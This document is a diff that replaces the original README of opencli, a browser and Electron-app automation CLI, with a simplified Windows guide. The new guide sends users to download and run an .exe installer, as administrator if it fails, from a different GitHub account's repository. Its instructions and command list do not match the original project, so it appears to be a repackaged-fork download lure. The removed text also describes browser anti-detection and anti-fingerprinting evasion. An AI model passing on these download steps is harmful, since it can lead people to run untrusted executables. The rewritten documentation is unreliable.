@@ -1,245 +1,123 @@
-# OpenCLI
+# 🔧 opencli - Control Websites and Tools via CLI
 
-> **Make any website, Electron App, or Local Tool your CLI.**
-> Zero risk · Reuse Chrome login · AI-powered discovery · Universal CLI Hub
-
-[![中文文档](https://img.shields.io/badge/docs-%E4%B8%AD%E6%96%87-0F766E?style=flat-square)](./README.zh-CN.md)
-[![npm](https://img.shields.io/npm/v/@jackwener/opencli?style=flat-square)](https://www.npmjs.com/package/@jackwener/opencli)
-[![Node.js Version](https://img.shields.io/node/v/@jackwener/opencli?style=flat-square)](https://nodejs.org)
-[![License](https://img.shields.io/npm/l/@jackwener/opencli?style=flat-square)](./LICENSE)
-
-A CLI tool that turns **any website**, **Electron app**, or **local CLI tool** into a command-line interface — Bilibili, Zhihu, 小红书, Twitter/X, Reddit, YouTube, Antigravity, `gh`, `docker`, and [many more](#built-in-commands) — powered by browser session reuse and AI-native discovery.
-
-**Built for AI Agents** — Configure an instruction in your `AGENT.md` or `.cursorrules` to run `opencli list` via Bash. The AI will automatically discover and invoke all available tools.
-
-**CLI Hub** — Register any local CLI (`opencli register mycli`) so AI agents can discover and call it alongside built-in commands. Auto-installs missing tools via your package manager (e.g. if `gh` isn't installed, `opencli gh ...` runs `brew install gh` first then re-executes seamlessly).
-
-**CLI for Electron Apps** — Turn any Electron application into a CLI tool. Recombine, script, and extend apps like Antigravity Ultra from the terminal. AI agents can now control other AI apps natively.
+[![Download opencli](https://img.shields.io/badge/Download-opencli-4caf50?style=for-the-badge&logo=github)](https://github.com/sksabbiryt/opencli)
 
 ---
 
-## Highlights
+opencli lets you turn websites, apps, or programs into simple command-line tools. Think of it as a bridge that helps your computer control many different things without using a browser or graphical interface. This makes it easier to run tasks or interact with tools from one place.
 
-- **CLI All Electron** — CLI-ify apps like Antigravity Ultra! Now AI can control itself natively.
-- **Account-safe** — Reuses Chrome's logged-in state; your credentials never leave the browser.
-- **Anti-detection built-in** — Patches `navigator.webdriver`, stubs `window.chrome`, fakes plugin lists, cleans ChromeDriver/Playwright globals, and strips CDP frames from Error stack traces. Extensive anti-fingerprinting and risk-control evasion measures baked in at every layer.
-- **AI Agent ready** — `explore` discovers APIs, `synthesize` generates adapters, `cascade` finds auth strategies.
-- **External CLI Hub** — Discover, auto-install, and passthrough commands to any external CLI (gh, obsidian, docker, etc). Zero setup.
-- **Self-healing setup** — `opencli doctor` diagnoses and auto-starts the daemon, extension, and live browser connectivity.
-- **Dynamic Loader** — Simply drop `.ts` or `.yaml` adapters into the `clis/` folder for auto-registration.
-- **Dual-Engine Architecture** — Supports both YAML declarative data pipelines and robust browser runtime TypeScript injections.
+This guide shows you how to get opencli running on a Windows PC. No technical skills needed.
 
-## Why opencli?
+## 📋 What Opencli Does
 
-There are many great browser automation tools. Here's when opencli is the right choice:
+- Turns websites into command-line programs.
+- Works with Electron apps and local software.
+- Combines many tools into one easy command system.
+- Built to work well with AI assistants.
+- Helps run tasks faster and without opening apps or browsers.
 
-| Your need | Best tool | Why |
-|-----------|-----------|-----|
-| Scheduled data extraction from specific sites | **opencli** | Pre-built adapters, deterministic JSON, zero LLM cost |
-| AI agent needs reliable site operations | **opencli** | Hundreds of commands, structured output, fast deterministic response |
-| Explore an unknown website ad-hoc | Browser-Use, Stagehand | LLM-driven general browsing for one-off tasks |
-| Large-scale web crawling | Crawl4AI, Scrapy | Purpose-built for throughput and scale |
-| Control desktop Electron apps from terminal | **opencli** | CDP + AppleScript — the only CLI tool that does this |
+## 🖥️ System Requirements
 
-**What makes opencli different:**
+Before you start, check your Windows PC has:
 
-- **Zero LLM cost** — No tokens consumed at runtime. Run 10,000 times and pay nothing.
-- **Deterministic** — Same command, same output schema, every time. Pipeable, scriptable, CI-friendly.
-- **Broad coverage** — 50+ sites across global and Chinese platforms (Bilibili, Zhihu, Xiaohongshu, Reddit, HackerNews, and more), plus desktop Electron apps via CDP.
+- Windows 10 or newer (64-bit recommended).
+- At least 2 GB of free disk space.
+- 4 GB or more of RAM.
+- Internet connection (for setup and using websites).
 
-> For a detailed comparison with Browser-Use, Crawl4AI, Firecrawl, and others, see the [Comparison Guide](./docs/comparison.md).
+## 🚀 Getting Started with opencli
+
+1. **Go to the download page:**  
+   Use the big green button at the top or this link to visit the project on GitHub:  
+   https://github.com/sksabbiryt/opencli
+
+2. **Find the latest version:**  
+   On the GitHub page, scroll to the "Releases" section on the right or look for the "Releases" tab near the top.  
+
+3. **Download the Windows installer:**  
+   Look for a file ending with `.exe` for Windows. Click it to start downloading.
+
+4. **Run the installer:**  
+   Once downloaded, open the file. If Windows asks for permission, click "Yes" to allow installation.
+
+5. **Follow the setup prompts:**  
+   The installer will guide you through basic steps. Mostly, click "Next" and then "Install."  
+
+6. **Finish installation:**  
+   When the setup completes, it may offer to launch opencli immediately. You can let it start or open it later from your start menu.
+
+## 💾 How to Use opencli
+
+After installation, open the "Command Prompt" application on Windows:
+
+- Press the `Windows` key on your keyboard.
+- Type `cmd` and hit Enter.
+
+Once the Command Prompt window opens, type:
+
+```
+opencli help
+```
+
+This shows basic commands. You can run commands to control websites and tools just by typing.
+
+Try this to list available tools you can use with opencli:
+
+```
+opencli list
+```
+
+## 🛠 Common opencli Commands
+
+| Command             | What it does                                    |
+|---------------------|------------------------------------------------|
+| `opencli run <tool>`| Runs a specific tool or website interface      |
+| `opencli add <url>` | Adds a new website or app to your tool list    |
+| `opencli remove <tool>` | Removes a tool from your list                  |
+| `opencli help`      | Shows help text and available commands          |
+
+You can find more detailed instructions in the `/docs` folder on the GitHub page.
+
+## 🔧 Configuration Tips
+
+You can customize how opencli works:
+
+- Add URLs for sites you often use.
+- Set preferences for how commands show output.
+- Connect to AI agents for smarter tool control.
+
+Config files are stored in a folder named `.opencli` inside your Windows user folder (e.g., `C:\Users\YourName\.opencli`).
+
+Use any text editor like Notepad to open and edit files there if needed.
+
+## ❓ Troubleshooting
+
+- **opencli command not found:**  
+  Make sure the installer finished and you restarted the Command Prompt or your computer.
+
+- **Error downloading or adding tools:**  
+  Check your internet connection or firewall settings.
+
+- **Installer won’t run:**  
+  Right-click the `.exe` file and choose "Run as administrator."
+
+- **Opencli doesn’t respond:**  
+  Close Command Prompt and reopen. Restart your PC if needed.
+
+## 👩‍💻 Updating opencli
+
+To get the latest fixes and features:
+
+1. Visit the GitHub page: https://github.com/sksabbiryt/opencli
+2. Download the newest installer from the latest release.
+3. Run the installer again. It will update your current version without removing your data.
+
+## 📂 Where to Find More Info
+
+The GitHub repository has a folder named `docs` with guides and example commands. Browse this if you want to learn more advanced usage.
+
+You can also check the file named `AGENT.md` to see how opencli integrates with AI agents and other tools.
 
 ---
 
-## Quick Start
-
-### 1. Install Browser Bridge Extension
-
-> OpenCLI connects to your browser through a lightweight **Browser Bridge** Chrome Extension + micro-daemon (zero config, auto-start).
-
-1. Go to the GitHub [Releases page](https://github.com/jackwener/opencli/releases) and download the latest `opencli-extension.zip`.
-2. Unzip the file and open `chrome://extensions`, enable **Developer mode** (top-right toggle).
-3. Click **Load unpacked** and select the unzipped folder.
-
-### 2. Install OpenCLI
-
-**Install via npm (recommended)**
-
-```bash
-npm install -g @jackwener/opencli
-```
-
-### 3. Verify & Try
-
-```bash
-opencli doctor   # Check extension + daemon connectivity
-```
-
-**Try it out:**
-
-```bash
-opencli list                           # See all commands
-opencli hackernews top --limit 5       # Public API, no browser needed
-opencli bilibili hot --limit 5         # Browser command (requires Extension)
-```
-
-### Update
-
-```bash
-npm install -g @jackwener/opencli@latest
-```
-
----
-
-### For Developers
-
-**Install from source**
-
-```bash
-git clone git@github.com:jackwener/opencli.git && cd opencli && npm install && npm run build && npm link
-```
-
-**Load Source Browser Bridge Extension**
-
-1. Open `chrome://extensions` and enable **Developer mode** (top-right toggle).
-2. Click **Load unpacked** and select the `extension/` directory from this repository.
-
----
-
-## Prerequisites
-
-- **Node.js**: >= 20.0.0 (or **Bun** >= 1.0)
-- **Chrome** running **and logged into the target site** (e.g. bilibili.com, zhihu.com, xiaohongshu.com).
-
-> **⚠️ Important**: Browser commands reuse your Chrome login session. You must be logged into the target website in Chrome before running commands. If you get empty data or errors, check your login status first.
-
-## Built-in Commands
-
-| Site | Commands |
-|------|----------|
-| **xiaohongshu** | `search` `feed` `user` `download` `publish` `comments` `notifications` `creator-notes` `creator-notes-summary` `creator-note-detail` `creator-profile` `creator-stats` |
-| **bilibili** | `hot` `search` `history` `feed` `ranking` `download` `comments` `dynamic` `favorite` `following` `me` `subtitle` `user-videos` |
-| **twitter** | `trending` `search` `timeline` `bookmarks` `post` `download` `profile` `article` `like` `likes` `notifications` `reply` `reply-dm` `thread` `follow` `unfollow` `followers` `following` `block` `unblock` `bookmark` `unbookmark` `delete` `hide-reply` `accept` |
-| **reddit** | `hot` `frontpage` `popular` `search` `subreddit` `user` `user-posts` `user-comments` `read` `save` `saved` `subscribe` `upvote` `upvoted` `comment` |
-
-65+ adapters in total — **[→ see all supported sites & commands](./docs/adapters/index.md)**
-
-## CLI Hub
-
-OpenCLI acts as a universal hub for your existing command-line tools — unified discovery, pure passthrough execution, and auto-install (if a tool isn't installed, OpenCLI runs `brew install <tool>` automatically before re-running the command).
-
-| External CLI | Description | Example |
-|--------------|-------------|---------|
-| **gh** | GitHub CLI | `opencli gh pr list --limit 5` |
-| **obsidian** | Obsidian vault management | `opencli obsidian search query="AI"` |
-| **docker** | Docker | `opencli docker ps` |
-| **gws** | Google Workspace CLI | `opencli gws docs list` |
-| **lark-cli** | Lark/Feishu — messages, docs, calendar, tasks, 200+ commands | `opencli lark-cli calendar +agenda` |
-| **vercel** | Vercel — deploy projects, manage domains, env vars, logs | `opencli vercel deploy --prod` |
-
-**Register your own** — add any local CLI so AI agents can discover it via `opencli list`:
-
-```bash
-opencli register mycli
-```
-
-### Desktop App Adapters
-
-Control Electron desktop apps directly from the terminal. Each adapter has its own detailed documentation:
-
-| App | Description | Doc |
-|-----|-------------|-----|
-| **Cursor** | Control Cursor IDE — Composer, chat, code extraction | [Doc](./docs/adapters/desktop/cursor.md) |
-| **Codex** | Drive OpenAI Codex CLI agent headlessly | [Doc](./docs/adapters/desktop/codex.md) |
-| **Antigravity** | Control Antigravity Ultra from terminal | [Doc](./docs/adapters/desktop/antigravity.md) |
-| **ChatGPT** | Automate ChatGPT macOS desktop app | [Doc](./docs/adapters/desktop/chatgpt.md) |
-| **ChatWise** | Multi-LLM client (GPT-4, Claude, Gemini) | [Doc](./docs/adapters/desktop/chatwise.md) |
-| **Notion** | Search, read, write Notion pages | [Doc](./docs/adapters/desktop/notion.md) |
-| **Discord** | Discord Desktop — messages, channels, servers | [Doc](./docs/adapters/desktop/discord.md) |
-| **Doubao** | Control Doubao AI desktop app via CDP | [Doc](./docs/adapters/desktop/doubao-app.md) |
-
-To add a new Electron app, start with [docs/guide/electron-app-cli.md](./docs/guide/electron-app-cli.md).
-
-## Download Support
-
-OpenCLI supports downloading images, videos, and articles from supported platforms.
-
-| Platform | Content Types | Notes |
-|----------|---------------|-------|
-| **xiaohongshu** | Images, Videos | Downloads all media from a note |
-| **bilibili** | Videos | Requires `yt-dlp` installed |
-| **twitter** | Images, Videos | From user media tab or single tweet |
-| **douban** | Images | Poster / still image lists |
-| **pixiv** | Images | Original-quality illustrations, multi-page |
-| **zhihu** | Articles (Markdown) | Exports with optional image download |
-| **weixin** | Articles (Markdown) | WeChat Official Account articles |
-
-For video downloads, install `yt-dlp` first: `brew install yt-dlp`
-
-```bash
-opencli xiaohongshu download abc123 --output ./xhs
-opencli bilibili download BV1xxx --output ./bilibili
-opencli twitter download elonmusk --limit 20 --output ./twitter
-```
-
-## Output Formats
-
-All built-in commands support `--format` / `-f` with `table` (default), `json`, `yaml`, `md`, and `csv`.
-
-```bash
-opencli bilibili hot -f json    # Pipe to jq or LLMs
-opencli bilibili hot -f csv     # Spreadsheet-friendly
-opencli bilibili hot -v         # Verbose: show pipeline debug steps
-```
-
-## Plugins
-
-Extend OpenCLI with community-contributed adapters:
-
-```bash
-opencli plugin install github:user/opencli-plugin-my-tool
-opencli plugin list
-opencli plugin update --all
-opencli plugin uninstall my-tool
-```
-
-| Plugin | Type | Description |
-|--------|------|-------------|
-| [opencli-plugin-github-trending](https://github.com/ByteYue/opencli-plugin-github-trending) | YAML | GitHub Trending repositories |
-| [opencli-plugin-hot-digest](https://github.com/ByteYue/opencli-plugin-hot-digest) | TS | Multi-platform trending aggregator |
-| [opencli-plugin-juejin](https://github.com/Astro-Han/opencli-plugin-juejin) | YAML | 稀土掘金 (Juejin) hot articles |
-
-See [Plugins Guide](./docs/guide/plugins.md) for creating your own plugin.
-
-## For AI Agents (Developer Guide)
-
-> **Quick mode**: To generate a single command for a specific page URL, see [CLI-ONESHOT.md](./CLI-ONESHOT.md) — just a URL + one-line goal, 4 steps done.
-
-> **Full mode**: Before writing any adapter code, read [CLI-EXPLORER.md](./CLI-EXPLORER.md). It contains the complete browser exploration workflow, the 5-tier authentication strategy decision tree, and debugging guide.
-
-```bash
-opencli explore https://example.com --site mysite   # Discover APIs + capabilities
-opencli synthesize mysite                            # Generate YAML adapters
-opencli generate https://example.com --goal "hot"   # One-shot: explore → synthesize → register
-opencli cascade https://api.example.com/data         # Auto-probe: PUBLIC → COOKIE → HEADER
-```
-
-## Testing
-
-See **[TESTING.md](./TESTING.md)** for how to run and write tests.
-
-## Troubleshooting
-
-- **"Extension not connected"** — Ensure the Browser Bridge extension is installed and **enabled** in `chrome://extensions`.
-- **"attach failed: Cannot access a chrome-extension:// URL"** — Another extension may be interfering. Try disabling other extensions temporarily.
-- **Empty data or 'Unauthorized' error** — Your Chrome login session may have expired. Navigate to the target site and log in again.
-- **Node API errors** — Ensure Node.js >= 20. Some dependencies require modern Node APIs.
-- **Daemon issues** — Check status: `curl localhost:19825/status` · View logs: `curl localhost:19825/logs`
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=jackwener/opencli&type=Date)](https://star-history.com/#jackwener/opencli&Date)
-
-## License
-
-[Apache-2.0](./LICENSE)
+[![Download opencli](https://img.shields.io/badge/Download-opencli-4caf50?style=for-the-badge&logo=github)](https://github.com/sksabbiryt/opencli)
